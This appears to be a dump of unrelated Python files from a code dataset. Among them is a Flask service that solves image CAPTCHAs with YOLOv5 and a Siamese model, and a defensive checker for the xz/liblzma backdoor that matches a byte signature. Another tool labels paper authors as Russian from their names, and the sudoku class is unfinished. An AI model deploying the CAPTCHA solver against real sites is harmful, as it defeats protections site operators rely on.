\u8bad\u7ec3TF-IDF\u6a21\u578b\uff0c\u5373\u8ba1\u7b97TF-IDF\u503c\r\n    model = TfidfModel(corpus)\r\n\r\n    _item_profile = []\r\n    for i, data in enumerate(item_dataset.itertuples()):\r\n        itemId = data[0]\r\n        title = data[1]\r\n        genres = data[2]\r\n        # \u5f97\u5230\u6bcf\u4e2a\u7535\u5f71\u6807\u7b7e\u7684\u6bcf\u4e2a\u8bcd\u8bed\u7684\u8bcd\u5178\u7d22\u5f15\u548c\u6743\u91cd\uff0c\u7c7b\u4f3c[(0, 0.17342978500637887), (1, 0.21562355612017706), (2, 0.21205621229134275), (3, 0.1335891911679789), (4, 0.2004362408431816), (5, 0.34531665530514855), (6, 0.837374709121301)]\r\n        vector = model[corpus[i]]\r\n        #\u6309\u7167TF - IDF\u503c\u5f97\u5230top - n\u7684\u5173\u952e\u8bcd\r\n        item_tags = sorted(vector, key=lambda x: x[1], reverse=True)[:30]\r\n        topN_tags_weights = dict(map(lambda x: (dct[x[0]], x[1]), item_tags))\r\n        # \u5c06\u7c7b\u522b\u8bcd\u7684\u6dfb\u52a0\u8fdb\u53bb\uff0c\u5e76\u8bbe\u7f6e\u6743\u91cd\u503c\u4e3a1.0\r\n        for g in genres:\r\n            topN_tags_weights[g] = 1.0\r\n        topN_tags = [i[0] for i in topN_tags_weights.items()]\r\n        _item_profile.append((itemId, title, topN_tags, topN_tags_weights))\r\n\r\n    item_profile = pd.DataFrame(_item_profile, columns=[\"itemId\", \"title\", \"profile\", \"weights\"])\r\n    item_profile.set_index(\"itemId\", inplace=True)\r\n    return item_profile\r\n\r\n#\u83b7\u53d6\u7269\u54c1\u6570\u636e\u96c6\r\nitem_dataset = get_item_dataset()\r\nprint(item_dataset.head())\r\nprint(\"*\"*200)\r\n#\u8ba1\u7b97\u7269\u54c1\u753b\u50cf\r\nitem_profile = create_item_profile(item_dataset)\r\nprint(\"\u7269\u54c1\u753b\u50cf\uff1a\",item_profile.head())\r\nprint(\"*\"*200)\r\n\r\nlogging.basicConfig(format='%(asctime)s : %(levelname)s : %(message)s', level=logging.INFO)\r\nsentences = list(item_profile[\"profile\"].values)\r\n#model = gensim.models.Word2Vec(sentences, window=3, min_count=1, iter=20)\r\nmodel = gensim.models.Word2Vec(sentences, window=3, min_count=1, epochs=20)\r\n#words = input(\"\u8bf7\u8f93\u5165\u4f60\u611f\u5174\u8da3\u7684\u8bcd\u8bed: \")  # action\r\n#ret = model.wv.most_similar(positive=[words], topn=10)\r\n#print(ret)\r\nprint(\"\u7269\u54c1\u8bb0\u5f55\u6570\uff1a\",len(item_profile[\"profile\"]))\r\ndocuments = [TaggedDocument(words, [itemId]) for itemId, words in item_profile[\"profile\"].iteritems()]\r\n#documents = [TaggedDocument(words, [itemId]) for itemId, words in item_dataset[\"tags\"].iteritems()]\r\n# \u8bad\u7ec3\u6a21\u578b\u5e76\u4fdd\u5b58\r\nmodel = Doc2Vec(documents, vector_size=100, window=3, min_count=1, workers=4, epochs=20)\r\nfrom gensim.test.utils import get_tmpfile\r\nfname = get_tmpfile(\"my_doc2vec_model\")\r\nmodel.save(fname)\r\n\r\ncursor = conn.cursor()\r\ncursor.execute('delete from t_similar_item')\r\nconn.commit()\r\n\r\nfor item_id, row in item_profile.iterrows():\r\n    words= row[\"profile\"]\r",
    "import yolov5\nimport torch\nfrom siamese import Siamese\nfrom flask import Flask, request, jsonify\nimport matplotlib\n#matplotlib.use('TkAgg')\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom PIL import Image, ImageDraw\nfrom siamese import Siamese\nimport random\nimport string\nimport io\nimport os\n\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\napp = Flask(__name__)\n\ndef get_image_from_coordinates(image, coordinates):\n    x1, y1, x2, y2 = coordinates\n    return image.crop((x1, y1, x2, y2))\n\ndef load_image_from_bytes(image_bytes, cut_h_offset, clear_area):\n    image = Image.open(io.BytesIO(image_bytes))\n    width, height = image.size\n    box = (0, 0, width, height - cut_h_offset)\n    image = image.crop(box)\n    draw = ImageDraw.Draw(image)\n    draw.rectangle([tuple([0,0]), tuple(clear_area)], fill='white')\n    #image.show()\n    return image\n\n\ndef generate_random_string(length):\n    letters = string.ascii_letters + string.digits\n    return ''.join(random.choice(letters) for _ in range(length))\n\ndef plot_images_with_similarity(image, similarities,resutl_image):\n    \n    num_pairs = len(similarities)\n\n    # \u8bbe\u7f6e\u5b50\u56fe\u7684\u884c\u6570\u548c\u5217\u6570\n    rows = 2\n    cols = num_pairs\n\n    fig, axes = plt.subplots(rows, cols, figsize=(15, 6))\n\n    for i, (coord_small, coord_large, similarity) in enumerate(similarities):\n        image_small = get_image_from_coordinates(image, coord_small)\n        image_large = get_image_from_coordinates(image, coord_large)\n        #image_small.show()\n        #image_large.show()\n        # \u663e\u793a\u5c0f\u56fe\u50cf\n        axes[0, i].imshow(image_small)\n        axes[0, i].axis('off')\n        axes[0, i].set_title(f\"{i+1}\")\n\n        # \u663e\u793a\u5927\u56fe\u50cf\n        axes[1, i].imshow(image_large)\n        axes[1, i].axis('off')\n        axes[1, i].set_title(f\"{i+1}\\nSimilarity: {similarity.item()}\")\n\n    fig.tight_layout()\n    #print(axes)\n    #plt.show()\n    plt.savefig(resutl_image)\n    plt.close()\n\nSiameseModel = Siamese()\n\n\nmodel = yolov5.load('./weights/captch.pt')\n  \n# set model parameters\nmodel.conf = 0.25  # NMS confidence threshold\nmodel.iou = 0.45  # NMS IoU threshold\nmodel.agnostic = False  # NMS class-agnostic\nmodel.multi_label = False  # NMS multiple labels per box\nmodel.max_det = 1000  # maximum number of detections per image\n\n\n\n@app.route('/detect_image', methods=['POST'])\ndef detect_image():\n    similarities = []\n    filename = generate_random_string(10)\n    post_image = request.files['image'].read()\n    result_image_path = './tmp/result_' + filename + '.png'\n    image = load_image_from_bytes(post_image, 55, [135 ,50])\n    crop_image_path = './tmp/cropt_'+ filename + '.png'\n    image.save(crop_image_path)\n    # perform inference\n    results = model(crop_image_path)\n    results = model(crop_image_path, size=1280)\n    results = model(crop_image_path, augment=True)\n\n    if os.path.exists(crop_image_path):\n        os.remove(crop_image_path)\n\n    predictions = results.pred[0]\n    boxes = predictions[:, :4] # x1, y1, x2, y2\n    errcode = 0\n    print(boxes)\n\n    chars = []\n    targets = []\n\n    # \u904d\u5386\u5750\u6807\u6570\u636e\uff0c\u6839\u636e\u6761\u4ef6\u5c06\u6570\u636e\u653e\u5165\u5bf9\u5e94\u7684\u6570\u7ec4\u4e2d\n    for coord in boxes:\n        if coord[1].item() < 50 and coord[3].item() < 50:\n            chars.append(coord.tolist())\n        else:\n            targets.append(coord.tolist())\n\n    chars.sort(key=lambda x: x[0])\n\n    boxes = boxes.to(device)\n    \n    if len(chars) == 0:\n        errcode = 404\n    else:\n        #print(chars)\n        for coord_small in chars:\n            image_small = get_image_from_coordinates(image, coord_small)\n            max_similarity = 0\n            best_coord_large = None\n            for coord_large in targets:\n                image_large = get_image_from_coordinates(image, coord_large)\n                similarity =  SiameseModel.detect_image(image_small, image_large)\n                if similarity > max_similarity:\n                    max_similarity = similarity\n                    best_coord_large = coord_large\n            similarities.append((coord_small, best_coord_large, max_similarity))\n\n        #print(similarities)\n        plot_images_with_similarity(image ,similarities,result_image_path)\n    return jsonify({'code':errcode,'result_image_path': result_image_path})\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0',port=5000)",
    "# %matplotlib inline\nimport matplotlib, matplotlib.pyplot as plt\nfrom matplotlib.patches import Rectangle\nfrom typing import List\n\nmatplotlib.use('TkAgg')\n\n\nclass PlotIndexGraph:\n    def __init__(self, color_pallette_hex: List[str], labels: List[str]) -> None:\n        self.__color_pallette: list[str] = color_pallette_hex\n        self.__labels: list[str] = labels\n        \n        assert len(color_pallette_hex) == len(labels), \"O tamanho da lista de paleta de cores deve ser o mesmo tamanho da lista de labels\"\n        \n\n\n    def plot_and_show(self, values: list[int] | list[float], graph_precision: int, title: str, font_size: int, x_label: str, y_label: str) -> None:\n        assert len(values) == len(self.__labels), \"A lista de valores deve conter tamanho igual a lista de labels\"\n        assert all(isinstance(i, float | int) for i in values), \"A lista de valores deve conter apenas valores num\u00e9ricos\"\n        \n        y_ticks: list[float] = [float(i) for i in range(0, int(max(values) * 1.5), graph_precision)]\n        y_ticks.extend(values)\n        y_ticks.sort()\n        \n        bars: list[Rectangle] = plt.bar(self.__labels, values)\n        print(type(bars[0]))\n        plt.yticks(y_ticks)\n        plt.tick_params(axis='y', labelleft=False)\n        plt.tick_params(axis='y', left=False)\n        \n        \n        [bar.set_color(self.__color_pallette[idx]) for idx, bar in enumerate(bars)]\n        \n        plt.title(title, fontdict={'fontsize': font_size})\n        for idx, bar in enumerate(bars):\n          plt.text(bar.get_x() + bar.get_width() / 2.0, bar.get_height(), values[idx], ha='center', va='bottom', fontsize=font_size - 18)\n        plt.ylabel(y_label, fontdict={'fontsize': font_size - font_size // 2})\n        plt.xlabel(x_label, fontdict={'fontsize': font_size - font_size // 2})\n        \n        plt.show()\n\nif __name__ == '__main__':\n    labels = ['Sem \u00cdndice', 'HASH', 'BTREE', 'GIN', 'GIST', 'BRIN']\n    color_pallette = ['#1B51F2', '#1D79F2', '#22A2F2', '#F2CF1D', '#1D79F2', '#1B51F2']\n    \n    font_size = 32\n    \n    values_select_1 = [13.22, 13.14, 11.50, 13.86, 13.56, 15.18]\n    values_select_2 = [1.27, 1.53, 3.26, 0.57, 0.96, 1.60]\n    values_select_3 = [10.20, 12.17, 10.94, 12.33, 12.53, 12.60]\n    values_select_4 = [18.40, 13.85, 14.00, 13.29, 13.13, 13.94]\n    values_select_5 = [16.05, 17.44, 7.36, 19.96, 19.46, 20.74]\n    \n    graph_select = PlotIndexGraph(color_pallette, labels)\n    \n    graph_select.plot_and_show(values=values_select_1, graph_precision=10, title='Tempo m\u00e9dio de execu\u00e7\u00e3o SELECT 1', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tempo m\u00e9dio (Em MS)')\n    #graph_select.plot_and_show(values=values_select_2, graph_precision=5, title='Tempo m\u00e9dio de execu\u00e7\u00e3o SELECT 2', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tempo m\u00e9dio (Em MS)')\n    #graph_select.plot_and_show(values=values_select_3, graph_precision=17, title='Tempo m\u00e9dio de execu\u00e7\u00e3o SELECT 3', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tempo m\u00e9dio (Em MS)')\n    #graph_select.plot_and_show(values=values_select_4, graph_precision=12, title='Tempo m\u00e9dio de execu\u00e7\u00e3o SELECT 4', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tempo m\u00e9dio (Em MS)')\n    #graph_select.plot_and_show(values=values_select_5, graph_precision=10, title='Tempo m\u00e9dio de execu\u00e7\u00e3o SELECT 5', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tempo m\u00e9dio (Em MS)')\n        \n    labels = ['HASH', 'BTREE', 'GIN', 'GIST', 'BRIN']\n    color_pallette = ['#1B51F2', '#1D79F2', '#22A2F2', '#F2CF1D', '#1D79F2']    \n    \n    graph_size_1 = [6889472, 2695168, 1695744, 4997120, 196608]\n    graph_size_2 = [10125312, 3195776, 2293760, 6373376, 344064]\n    graph_size_3 = [6668288, 4046848, 1081344, 2998272, 294912]\n    graph_size_4 = [4276224, 1916928, 606208, 1220608, 245760]\n    graph_size_5 = [11681792, 4833280, 2433024, 6438912, 442368]\n\n    graph_size = PlotIndexGraph(color_pallette, labels)\n    #graph_size.plot_and_show(values=graph_size_1, graph_precision=5_000_000, title='Tamanho de \u00cdndices do SELECT 1', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tamanho do \u00cdndice(em Bytes)')\n    #raph_size.plot_and_show(values=graph_size_2, graph_precision=5_000_000, title='Tamanho de \u00cdndices do SELECT 2', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tamanho do \u00cdndice(em Bytes)')\n    #raph_size.plot_and_show(values=graph_size_3, graph_precision=5_000_000, title='Tamanho de \u00cdndices do SELECT 3', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tamanho do \u00cdndice(em Bytes)')\n    #graph_size.plot_and_show(values=graph_size_4, graph_precision=5_000_000, title='Tamanho de \u00cdndices do SELECT 4', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tamanho do \u00cdndice(em Bytes)')\n    #graph_size.plot_and_show(values=graph_size_5, graph_precision=5_000_000, title='Tamanho de \u00cdndices do SELECT 5', font_size=font_size, x_label='Tipo de \u00cdndice', y_label='Tamanho do \u00cdndice(em Bytes)')\n",
    "import subprocess\nfrom loguru import logger\n\n\nVERSAO_VULNERAVEL = [\"5.6.0\", \"5.6.1\"]\n\n\ndef verificar_caminho_sshd():\n    try:\n        caminho_sshd = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"sshd\"],\n            capture_output=True\n        )\n        caminho_sshd = caminho_sshd.stdout\n        retorno = caminho_sshd.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_liblzma(path_sshd):\n    try:\n        logger.info(f\"Verificando ldd: {path_sshd}\")\n        ldd_output = subprocess.run([\"ldd\", path_sshd], capture_output=True)\n        ldd_output = ldd_output.stdout\n        path_liblzma = ldd_output.decode(\"utf-8\").split()\n        retorno_lista = list(filter(lambda x: 'liblzma' in x, path_liblzma))\n        logger.info(f\"Lista: {retorno_lista}\")\n        return retorno_lista[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_xz():\n    try:\n        caminho_xz = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"xz\"],\n            capture_output=True\n        )\n        caminho_xz = caminho_xz.stdout\n        logger.info(caminho_xz)\n        retorno = caminho_xz.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\ndef conferir_assinatura(path):\n    hex_dump_liblzma = subprocess.run([\n        \"hexdump\",\n        \"-ve\",\n        '1/1 \\\"%02x\\\"',\n        path],\n        capture_output=True\n    )\n    hex_dump_liblzma = hex_dump_liblzma.stdout\n    if \"f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410\" in hex_dump_liblzma.decode(\"utf-8\"):\n        logger.warning(\"Assinatura da liblzma: VULNERAVEL\")\n    else:\n        logger.success(\"Assinatura da liblzma: OK\")\n\ndef conferir_xz_versao():\n    versao_xz = subprocess.run([\n        \"xz\",\n        \"--version\"\n    ],\n    capture_output=True)\n    versao_xz = versao_xz.stdout\n    versao_local = versao_xz.decode(\"utf-8\").split()\n    if versao_local[1] in VERSAO_VULNERAVEL:\n        logger.warning(\"xz VULNERAVEL\")\n    else:\n        logger.success(\"xz OK\")\n\n\nif __name__ == \"__main__\":\n    logger.info(\"Inicializando CVE...\")\n    vh = verificar_caminho_sshd()\n    vl = verificar_liblzma(vh)\n    conferir_assinatura(vl)\n    vz = verificar_xz()\n    conferir_xz_versao()\n    logger.info(\"Encerrando CVE...\")",
    "from rouge_score import rouge_scorer\nfrom nltk.tokenize import sent_tokenize\nimport numpy as np\ndef rouge(reference, candidate, types=['rouge1', 'rouge2', 'rougeL', 'rougeLsum'], use_stemmer=True,\n          split_summaries=True):\n    \"\"\"\n    This is based on rouge-score 0.0.4\n    If using rougeLsum, it is necessary to split sentences with '\\n' in summaries in advance\n    \"\"\"\n    if 'rougeLsum' in types and split_summaries:\n        reference = '\\n'.join(sent_tokenize(reference))\n        candidate = '\\n'.join(sent_tokenize(candidate))\n\n    results = {}\n    for t in types:\n        if t not in ['rouge1', 'rouge2', 'rougeL', 'rougeLsum']:\n            print(\"The type must be selected in rouge1, rouge2, rougeL, and rougeLsum.\")\n            return results\n    scorer = rouge_scorer.RougeScorer(types, use_stemmer=use_stemmer)\n    scores = scorer.score(reference, candidate)\n    for t in types:\n        r = {}\n        r[\"precision\"] = scores[t].precision\n        r[\"recall\"] = scores[t].recall\n        r[\"fmeasure\"] = scores[t].fmeasure\n        results[t] = r\n    return results\n\n\ndef rouge_corpus(references, candidates, types=['rouge1', 'rouge2', 'rougeL', 'rougeLsum'], use_stemmer=True,\n                 split_summaries=True):\n    if len(references) != len(candidates):\n        print(\"len must be equal\")\n        return None\n    results = {}\n    for t in types:\n        s = {}\n        s['recall'] = []\n        s['precision'] = []\n        s['fmeasure'] = []\n        results[t] = s\n    for ref, can in zip(references, candidates):\n        s = rouge(ref, can, types=types, use_stemmer=use_stemmer, split_summaries=split_summaries)\n        for t in types:\n            results[t]['recall'].append(s[t]['recall'])\n            results[t]['precision'].append(s[t]['precision'])\n            results[t]['fmeasure'].append(s[t]['fmeasure'])\n\n    final_results = {}\n    for t in types:\n        s = results[t]\n        tmp = {}\n        tmp['precision'] = np.mean(s['precision'])\n        tmp['recall'] = np.mean(s['recall'])\n        tmp['fmeasure'] = np.mean(s['fmeasure'])\n        final_results[t] = tmp\n    return final_results",
    "from fastapi import FastAPI\nfrom typing import List\nfrom sentence_transformers import CrossEncoder\nimport numpy as np\n\n# Load the small re-ranker model from mixedbread.ai\nmodel = CrossEncoder(\"mixedbread-ai/mxbai-rerank-xsmall-v1\")\n\napp = FastAPI(title=\"BreadRanker\",\n        description=\"A small reranker service for use with RAG workflows. It uses the mixedbread.ai reranker model.\",\n        version=\"1.0\",\n        contact={\n            \"name\": \"Pat Wendorf\",\n            \"email\": \"pat.wendorf@mongodb.com\",\n    },\n    license_info={\n        \"name\": \"MIT\",\n        \"url\": \"https://opensource.org/license/mit/\",\n    })\n\n@app.get(\"/\")\nasync def root():\n    return {\"message\": \"Reank some docs! See /docs for more info.\"}\n\n@app.post(\"/rerank/\")\nasync def rerank(query: str, documents: List[str], top_k: int):\n    results = model.rank(query, documents, return_documents=True, top_k=top_k)\n    # Clean up those float32's\n    serializable_list = [{k: float(v) if isinstance(v, np.float32) else v for k, v in d.items()} for d in results]\n    return {\"query\": query, \"results\": serializable_list}",
    "alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n\ndef caesar(start_text, shift_amount, cipher_direction):\n  end_text = \"\"\n  if cipher_direction == \"decode\":\n    shift_amount *= -1\n  for char in start_text:\n    if char in alphabet:\n      position = alphabet.index(char)\n      new_position = position + shift_amount\n      end_text += alphabet[new_position]\n    else:\n      end_text += char\n  print(f\"Here's the {cipher_direction}d result: {end_text}\")\n\nfrom art import logo\nprint(logo)\n\n\nshould_end = False\nwhile not should_end:\n  direction = input(\"Type 'encode' to encrypt, type 'decode' to decrypt:\\n\")\n  text = input(\"Type your message:\\n\").lower()\n  shift = int(input(\"Type the shift number:\\n\"))\n  shift = shift % 26\n  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)\n  restart = input(\"Type 'yes' if you want to go again. Otherwise type 'no'.\\n\")\n  if restart == \"no\":\n    should_end = True\n    print(\"Goodbye\")\n",
    "import io\nimport os\nfrom PIL import Image\n\nfrom sentence_transformers import SentenceTransformer\n\nimport vecs\n\nmodel = SentenceTransformer(\"clip-ViT-B-32\")\n\nVECS_DB_URL = os.getenv(\"VECS_DB_URL\", \"\")\n\nvx = vecs.create_client(VECS_DB_URL)\ncollection = vx.get_or_create_collection(name=\"image_vectors\", dimension=512)\ncollection.create_index()\n\n\ndef image_to_embedding(image_bytes: bytes):\n    return model.encode(Image.open(io.BytesIO(image_bytes)))  # type: ignore\n\n\ndef add_embedding_to_index(id: str, embedding, metadata: dict):\n    collection.upsert(\n        records=[\n            (\n                id,\n                embedding,\n                metadata,\n            ),\n        ]\n    )\n\n\ndef search(query_text: str, max_results: int = 1) -> list[str]:\n    # query_text = \"a bike in front of a red brick wall\"\n    text_emb = model.encode(query_text)\n\n    # query the collection filtering metadata for \"type\" = \"jpg\"\n    results = collection.query(\n        data=text_emb,  # required\n        limit=max_results,  # number of records to return\n        # filters={\"type\": {\"$eq\": \"jpg\"}},  # metadata filters\n    )\n    return [res[0] if not isinstance(res, str) else res for res in results]\n",
    "'''\nMIT License\n\nCopyright 2024 National Technology & Engineering Solutions of Sandia, LLC (NTESS). Under the terms of Contract DE-NA0003525 with NTESS, the U.S. Government retains certain rights in this software.\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n'''\n\nimport openpyxl\nimport json\nimport sys\nimport os\nimport re\n\ndef create_directory(xlsx_file):\n    dir_name = xlsx_file.split('.')[0]\n    path = './' + dir_name\n\n    if not os.path.exists(path):\n        os.mkdir(path)\n        print(\">>> Folder %s created!\" % path)\n        return path\n    else:\n        print(\">>> Folder %s already exists\" % path)\n        return 'Error'\n\n\ndef create_json_files(xlsx_file):\n    certification = openpyxl.load_workbook(xlsx_file)\n    models = certification.sheetnames\n\n    path = create_directory(xlsx_file)\n\n    if path != 'Error':\n        for model in models:\n            if model not in ['Instructions', 'Testing Info', 'Certification Info']:\n                json_data = {}\n\n                for row in range(1, certification[model].max_row + 1):\n                    json_data[certification[model].cell(row, 1).value] = []\n                    for col in range(2, certification[model].max_column + 1):\n                        json_data[certification[model].cell(row, 1).value].append(certification[model].cell(row, col).value)\n                \n                with open(f\"{path}/raw_json_{model}.json\", \"w\") as f:\n                    json.dump(json_data,f)\n\n        generate_device_map(path)\n    else:\n        print('>>> There is a path error. Exiting...')\n\ndef extract_text(text):\n    if text is not None:\n        match = re.search(r'\\((.*?)\\)', text)\n        if match:\n            return match.group(1)\n        else:\n            return text\n    else:\n        return None\n\ndef generate_device_map(directory):\n    raw_json_files = [file for file in os.listdir(directory) if file.endswith('json')]\n\n    models_data = []\n    for raw_json_file in raw_json_files:\n        with open(directory + '/' + raw_json_file) as json_file:\n            model_data = json.load(json_file)\n            if model_data:\n                models_data.append({})\n                for rtg, value in model_data.items():\n                    if rtg != 'Address':\n                        if extract_text(value[0]):\n                            models_data[-1][extract_text(value[0])] = value[3]\n    \n    output_model_data = {'models': models_data}\n    with open(f\"{directory}/device_map.json\", \"w\") as f:\n        json.dump(output_model_data, f, indent=4)\n    \n    print('>>> DER Device map is successfully generated.')\n\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print('>>> Please provide exactly one argument - the Excel file to be parsed for the DER device.')\n    else:\n        xlsx_file = sys.argv[1]\n        create_json_files(xlsx_file)\n",
    "import random as rd\nimport numpy as np\nclass SudokuBacktracking:\n    def __init__(self,n=0) -> None:\n        self.nb_initialized_case=n # number of initialized cases\n        self.board=[[0 for _ in range(9)]for _ in range(9)]\n\n    def generate_board(self):\n        self.nb_initialized_case=17+rd.random()%(46-17+1)\n        #using numpy\n        self.nb_initialized_case=np.random.randint(17,46)\n        for i in range(self.nb_initialized_case):\n            i,j=self.get_random_case()\n            val=np.random.randint(1,9)\n            while not self.valid_proposition(i,j,val):\n                val=np.random.randint(1,9)\n\n\n\n    def get_random_case(self):\n        ok=True\n        while ok:\n            i=np.random.randint(0,len(self.board)-1)\n            j=np.random.randint(0,len(self.board)-1)\n            if self.board[i][j]==0:\n                ok=False\n        return i,j\n\n\n    def print_board(self):\n        for i in range(9):\n            for j in range(9):\n                print(self.board[i][j],end=\"\\t\")\n\n    def valid_proposition(self,indL, indC, val_prop)->bool:\n        #verify if the proposition value is not unique on the line\n        if val_prop in self.board[indL]:\n            return False\n        \n        #verify if the proposition value is not unique on the line\n        i=0\n        valid=True\n        while i<9 and valid:\n            if self.board[i][indC]==val_prop:\n                valid=False\n            i+=1\n        if not valid:\n            return False\n        #verify the 3x3 square    \n\n    def solve(self):\n        pass\n\n\n#testing\nsudoku=SudokuBacktracking()\nsudoku.generate_board()\nsudoku.print_board()\nsudoku.solve()\nprint(\"The solved sudoku board is\")\nsudoku.print_board()\n",
    "import unittest\nfrom regdbot.brain.utils import extract_code_from_markdown\n\nclass TestExtractCodeFromMarkdown(unittest.TestCase):\n    def test_extract_code_from_single_block(self):\n        markdown_text = \"```python\\nprint('Hello, World!')\\n```\"\n        expected_code = \"print('Hello, World!')\"\n        self.assertEqual(expected_code, extract_code_from_markdown(markdown_text))\n\n    def test_extract_code_from_multiple_blocks(self):\n        markdown_text = \"```python\\nprint('Hello, World!')\\n```\\n```python\\nprint('Goodbye, World!')\\n```\"\n        expected_code = \"print('Hello, World!')\\nprint('Goodbye, World!')\"\n        self.assertEqual(expected_code, extract_code_from_markdown(markdown_text))\n\n    def test_extract_code_with_no_code_blocks(self):\n        markdown_text = \"This is a markdown text with no code blocks.\"\n        expected_code = \"\"\n        self.assertEqual(extract_code_from_markdown(markdown_text), expected_code)\n\n    def test_extract_code_with_empty_code_blocks(self):\n        markdown_text = \"```\\n\\n```\"\n        expected_code = \"\"\n        self.assertEqual(expected_code, extract_code_from_markdown(markdown_text))\n\n    def test_extract_code_with_nested_code_blocks(self):\n        markdown_text = \"```python\\nprint('```Hello, World!```')\\n```\"\n        expected_code = \"print('```Hello, World!```')\"\n        self.assertEqual(expected_code,extract_code_from_markdown(markdown_text))\n\nif __name__ == '__main__':\n    unittest.main()\n",
    "import requests\r\nimport bibtexparser\r\nfrom bs4 import BeautifulSoup\r\nfrom xml.etree import ElementTree as ET\r\nfrom transformers import AutoTokenizer, AutoModelForSequenceClassification\r\nimport torch\r\nimport time\r\n\r\nmodel_checkpoint = \"Gao-Tianci/RussScholar-Seeker\"\r\ntokenizer = AutoTokenizer.from_pretrained(model_checkpoint)\r\nmodel = AutoModelForSequenceClassification.from_pretrained(model_checkpoint)\r\nmodel.eval()\r\n\r\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\nmodel.to(device)\r\n\r\ndef predict_russian_author(names):\r\n    inputs = tokenizer(names, padding=True, truncation=True, return_tensors=\"pt\")\r\n    inputs = {k: v.to(device) for k, v in inputs.items()}\r\n    with torch.no_grad():\r\n        outputs = model(**inputs)\r\n    predictions = torch.argmax(outputs.logits, dim=1).cpu().numpy()\r\n    return predictions\r\n\r\ndef format_doi(doi):\r\n    if doi and not doi.startswith('https://'):\r\n        return f\"https://doi.org/{doi}\"\r\n    return doi\r\n\r\ndef parse_xml(content):\r\n    root = ET.fromstring(content)\r\n    for hit in root.findall('.//hit'):\r\n        title = hit.find('.//title').text\r\n        authors = [author.text for author in hit.findall('.//author')]\r\n        doi = hit.find('.//doi').text if hit.find('.//doi') is not None else 'DOI not available'\r\n        doi = format_doi(doi)\r\n        process_entry(title, authors, doi)\r\n\r\ndef parse_html(content):\r\n    soup = BeautifulSoup(content, 'html.parser')\r\n    entries = soup.find_all(\"li\", class_=\"entry inproceedings\")\r\n    for entry in entries:\r\n        title = entry.find(class_=\"title\").text\r\n        authors = [span.text for span in entry.find_all(\"span\", itemprop=\"name\")]\r\n        doi_element = entry.find(\"a\", href=lambda href: href and \"doi.org\" in href)\r\n        doi = doi_element[\"href\"] if doi_element else 'DOI not available'\r\n        doi = format_doi(doi)\r\n        process_entry(title, authors, doi)\r\n\r\ndef parse_bibtex(content):\r\n    bib_database = bibtexparser.loads(content)\r\n    for entry in bib_database.entries:\r\n        title = entry['title']\r\n        authors = entry['author'].split(' and ')\r\n        doi = entry.get('doi', 'DOI not available')\r\n        doi = format_doi(doi)\r\n        process_entry(title, authors, doi)\r\n\r\ndef process_entry(title, authors, doi):\r\n    predictions = predict_russian_author(authors)\r\n    if 1 in predictions:\r\n        russian_authors = [authors[i] for i, pred in enumerate(predictions) if pred == 1]\r\n        print(f\"Title: {title}\")\r\n        print(f\"Authors: {', '.join(authors)}\")\r\n        print(f\"Russian Authors: {', '.join(russian_authors)}\")\r\n        print(f\"DOI: {doi}\")\r\n        print(\"-\" * 60)\r\n\r\ndef detect_content_type(response_headers):\r\n    content_type = response_headers.get('Content-Type', '')\r\n    if 'xml' in content_type:\r\n        return 'xml'\r\n    elif 'bibtex' in content_type:\r\n        return 'bibtex'\r\n    else:\r\n        return 'html'\r\n\r\n# URL for testing\r\nurl = \"https://dblp.org/search/publ/api?q=stream%3Astreams%2Fconf%2Faaai%3A&h=1000&format=xml\"\r\nresponse = requests.get(url)\r\ncontent_type = detect_content_type(response.headers)\r\n\r\nstart_time = time.time()  # Start time of the program\r\nif content_type == 'html':\r\n    parse_html(response.text)\r\nelif content_type == 'xml':\r\n    parse_xml(response.text)\r\nelif content_type == 'bibtex':\r\n    